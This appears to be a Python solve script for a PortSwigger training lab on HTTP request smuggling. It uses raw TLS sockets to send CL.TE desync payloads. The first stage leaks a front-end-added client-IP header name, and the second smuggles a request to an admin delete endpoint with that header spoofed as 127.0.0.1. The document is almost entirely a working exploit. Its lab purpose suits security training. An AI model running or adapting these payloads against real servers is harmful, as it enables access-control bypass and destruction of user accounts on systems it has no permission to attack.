#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Exploiting HTTP request smuggling to reveal front-end request rewriting.

Stage 1: smuggle a POST to the search endpoint with oversized Content-Length.
The back-end eats the next real request's headers as the smuggled POST's body;
the search endpoint reflects them, leaking the front-end-added X-<random>-Ip
header name.

Stage 2: smuggle GET /admin/delete?username=carlos with the leaked header
set to 127.0.0.1 to delete carlos.

Raw TLS sockets throughout — `requests` would normalize the length headers.
"""

import argparse
import re
import socket
import ssl
from urllib.parse import urlparse


LEAK_TEMPLATE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 124\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "POST / HTTP/1.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 200\r\n"
    "Connection: close\r\n"
    "\r\n"
    "search=test"
)


def exploit_template(host: str, header_name: str) -> str:
    smuggled = (
        f"GET /admin/delete?username=carlos HTTP/1.1\r\n"
        f"{header_name}: 127.0.0.1\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: 10\r\n"
        f"Connection: close\r\n"
        f"\r\n"
        f"x=1"
    )
    outer_body = "0\r\n\r\n" + smuggled
    cl = len(outer_body.encode())
    return (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Content-Length: {cl}\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"\r\n"
        f"{outer_body}"
    )


def send_sequence(host: str, port: int, body: bytes, count: int = 2) -> list[bytes]:
    ctx = ssl.create_default_context()
    responses = []
    with socket.create_connection((host, port), timeout=10) as sock:
        with ctx.wrap_socket(sock, server_hostname=host) as ssock:
            ssock.settimeout(5)
            for _ in range(count):
                ssock.sendall(body)
                data = b""
                try:
                    while True:
                        chunk = ssock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                        if len(data) > 4000:
                            break
                except socket.timeout:
                    pass
                responses.append(data)
    return responses


def main():
    parser = argparse.ArgumentParser(
        description="Solve HTTP Request Smuggling Lab 8 (reveal front-end rewriting)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    parsed = urlparse(args.lab_url)
    host = parsed.hostname
    port = parsed.port or 443

    # Stage 1: leak header
    print(f"[*] Stage 1: leaking rewrite header via oversized-CL search smuggle")
    leak_body = LEAK_TEMPLATE.format(host=host).encode()
    responses = send_sequence(host, port, leak_body)
    last = responses[-1].decode(errors="replace")

    m = re.search(r"(X-[A-Za-z0-9-]+-Ip):", last, re.IGNORECASE)
    if not m:
        print("[-] Couldn't find X-*-Ip header in reflected response. Dump:")
        print(last[:2000])
        return
    header_name = m.group(1)
    print(f"[+] Leaked header name: {header_name}")

    # Stage 2: delete carlos
    print(f"\n[*] Stage 2: smuggling /admin/delete?username=carlos with {header_name}: 127.0.0.1")
    exploit_body = exploit_template(host, header_name).encode()
    responses = send_sequence(host, port, exploit_body)
    for i, r in enumerate(responses, 1):
        status = r.split(b"\r\n", 1)[0].decode(errors="replace") if r else "<empty>"
        print(f"[+] Response {i} status: {status}")

    print("\n[*] Check lab — carlos should be deleted and the lab marked solved.")


if __name__ == "__main__":
    main()
